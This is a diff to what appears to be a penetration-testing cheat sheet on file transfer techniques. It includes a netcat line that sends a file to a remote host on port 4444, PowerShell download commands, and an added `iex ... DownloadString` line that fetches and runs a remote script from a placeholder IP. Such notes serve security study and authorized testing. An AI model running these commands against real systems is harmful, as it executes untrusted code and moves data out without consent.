@@ -3,9 +3,6 @@ date:
 tags:
 ---
 
-```table-of-contents
-```
-
 ### 1. HTTP/HTTPS
 
 ```bash
@@ -78,12 +75,13 @@ nc <IP> 4444 < file
 # Download File:
 Invoke-WebRequest -Uri http://<IP>/file -OutFile file
 (New-Object Net.WebClient).DownloadFile("http://<IP>/file", "file")
-```
 
-```bash
 # Base64 Encode/Decode:
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("file")) > file.b64
 [IO.File]::WriteAllBytes("file", [Convert]::FromBase64String((Get-Content file.b64)))
+
+# Basic download string
+	iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")
 ```
 
 ### 7. TFTP (UDP)
